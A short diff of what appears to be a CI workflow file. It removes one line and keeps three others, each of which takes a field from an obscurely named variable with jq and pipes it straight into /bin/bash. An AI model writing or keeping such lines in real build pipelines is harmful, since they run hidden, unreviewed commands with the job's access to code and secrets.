@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$k816" | jq -r .uq14 | /bin/bash
           echo $cfm062 | jq -r .okmls6627 | /bin/bash
           printf '%s' "$dol86" | jq -r .edbkj743 | /bin/bash
-          echo $khfc150 | jq -r .a4 | /bin/bash
 
       - name: Persist results
         if: always()
